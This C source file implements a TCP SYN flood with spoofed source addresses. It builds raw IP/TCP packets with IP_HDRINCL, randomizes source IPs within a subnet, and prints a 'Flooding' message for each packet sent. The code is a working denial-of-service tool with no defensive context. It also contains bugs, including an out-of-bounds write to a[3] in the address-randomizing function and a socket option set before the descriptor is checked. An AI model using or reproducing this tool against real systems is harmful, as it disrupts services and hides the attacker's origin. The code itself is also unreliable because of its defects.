#include<stdio.h>
#include<stdlib.h>
#include<time.h>
#include<string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/tcp.h>

#include "utility.h"

char *rangeIP(char IpAddr[],char buf[])
{
	//srand (time(NULL));
   	char *token=NULL;
	char *a[3];
   	char temp[32]="";
   	char temp3[32];
   	int j=0,num,num2;
   	strcpy(temp3,IpAddr);
   	token=strtok(temp3,".");

   	while(token != NULL)
   	{
   		a[j]=token;
   		token=strtok(NULL,".");
   		j++;
   	}
   	num=rand()%253+1;
   	num2=rand()%252+2;
   	snprintf(a[3],4,"%d",num);
   	snprintf(a[2],4,"%d",num2);
   	strcat(temp,a[0]);
	strcat(temp,".");
	strcat(temp,a[1]);
	strcat(temp,".");
	strcat(temp,a[2]);
	strcat(temp,".");
	strcat(temp,a[3]);
	strcpy(buf,temp);

	return buf;
}

void syn(char *source_ip, int source_port, char *dest_ip, int dest_port){
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    int hincl = 1;                  /* 1 = on, 0 = off */
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));

	if(fd < 0)
	{
		perror("Error creating raw socket ");
		exit(1);
	}

	char packet[65536];
	memset(packet, 0, 65536);

	//IP header pointer
	struct iphdr *iph = (struct iphdr *)packet;

	//TCP header pointer
	struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
	struct pseudo_header psh; //pseudo header

	//ref: https://github.com/exinton/TCP_Flooding_IP_SPoofing/blob/master/syn.c
	//the IP header
	iph->version = 4;
	iph->ihl = 5;
	iph->tos = 0;
	iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
	iph->id = htons(112);
	iph->frag_off = 0;
	iph->ttl = 255;
	iph->protocol =IPPROTO_TCP;
	iph->check = checksum((unsigned short*)iph, sizeof(struct iphdr));
	iph->saddr = inet_addr(source_ip);
	iph->daddr = inet_addr(dest_ip);

    //the TCP header
    tcph->source = htons(source_port);
	tcph->dest = htons(dest_port);
	tcph->seq = 0;
	tcph->ack_seq = 0;
	tcph->res1 = 0;
    tcph->doff = 5;
    tcph->fin = 0;
    tcph->syn = 1;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    tcph->ece = 0;
	tcph->cwr = 0;
	tcph->window = htons(65535);
    tcph->check = 0;
    tcph->urg_ptr = 0;
	//TCP checksum
		__bzero(&psh, sizeof(struct pseudo_header));
		psh.source_address = inet_addr(source_ip);
		psh.dest_address = inet_addr(dest_ip);
		psh.placeholder = 0;
		psh.protocol = IPPROTO_TCP;
		psh.length = htons(sizeof(struct tcphdr));

		char *temp;
		temp = malloc(sizeof(struct pseudo_header) + sizeof(struct tcphdr));
		memcpy(temp, &psh, sizeof(struct pseudo_header));
		memcpy(temp+sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
	tcph->check = checksum((unsigned short*)temp, sizeof(struct pseudo_header) + sizeof(struct tcphdr));

	//send the packet
	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = inet_addr(dest_ip);
	sin.sin_port = htons(dest_port);

	int len = sendto(fd, packet, ntohs(iph->tot_len), 0, (struct sockaddr*)&sin, sizeof(struct sockaddr_in));
	if(len < 0)
		puts("error sending packet");
	else
		printf("Flooding %s:%d from %s:%d\n", dest_ip, dest_port, source_ip, source_port);
	close(fd);
}

unsigned short checksum(unsigned short *ptr,int nbytes)
{
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((unsigned char*)&oddbyte)=*(unsigned char*)ptr;
        sum+=oddbyte;
    }

    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;

    return(answer);
}